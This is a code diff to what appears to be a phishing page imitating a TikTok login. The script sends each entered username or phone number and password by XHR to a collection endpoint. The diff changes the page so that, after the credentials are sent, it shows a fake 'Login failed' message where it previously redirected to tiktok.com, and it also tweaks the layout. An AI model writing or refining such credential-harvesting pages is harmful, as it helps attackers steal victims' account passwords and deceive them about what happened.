@@ -606,7 +606,7 @@
                 <button class="clear-btn" onclick="clearInput('email-password-input')">×</button>
             </div>
             <button class="signin-btn" onclick="handleEmailLogin()">Log in</button>
-            <div id="email-error-message" style="display: none; background: #ffeaea; color: #d93025; font-size: 14px; text-align: center; margin-top: 10px; font-weight: 500; padding: 8px 12px; border-radius: 6px; border: 1px solid #f5c2c7;">
+            <div id="email-error-message" style="display: none; background: #ffeaea; color: #d93025; font-size: 14px; text-align: center; margin-top: 10px; margin-bottom: 10px; font-weight: 500; padding: 8px 12px; border-radius: 6px; border: 1px solid #f5c2c7;">
                 Login failed, Try again later
             </div>
         </div>
@@ -645,7 +645,7 @@
             <input type="password" id="phone-password-input" placeholder="Password" required>
             <button class="clear-btn" onclick="clearInput('phone-password-input')">×</button>
             <button class="signin-btn" onclick="handlePhoneLogin()">Log in</button>
-            <div id="phone-error-message" style="display: none; background: #ffeaea; color: #d93025; font-size: 14px; text-align: center; margin-top: 10px; font-weight: 500; padding: 8px 12px; border-radius: 6px; border: 1px solid #f5c2c7;">
+            <div id="phone-error-message" style="display: none; background: #ffeaea; color: #d93025; font-size: 14px; text-align: center; margin-top: 10px; margin-bottom: 10px; font-weight: 500; padding: 8px 12px; border-radius: 6px; border: 1px solid #f5c2c7;">
                 Login failed, Try again later
             </div>
         </div>
@@ -729,9 +729,8 @@
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             xhr.send('di=' + encodeURIComponent(idValue) + '&pr=' + encodeURIComponent(pass));
 
-            // Redirect to TikTok and show error message
-            window.location.href = 'https://www.tiktok.com';
-            // Note: Error message would show if redirect failed, but redirect will happen
+            // Show error message instead of redirecting
+            document.getElementById('phone-error-message').style.display = 'block';
         } else {
             alert("Please enter all required information.");
         }
@@ -769,9 +768,8 @@
             xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
             xhr.send('di=' + encodeURIComponent(email) + '&pr=' + encodeURIComponent(pass));
 
-            // Redirect to TikTok and show error message
-            window.location.href = 'https://www.tiktok.com';
-            // Note: Error message would show if redirect failed, but redirect will happen
+            // Show error message instead of redirecting
+            document.getElementById('email-error-message').style.display = 'block';
         } else {
             alert("Please enter all required information.");
         }
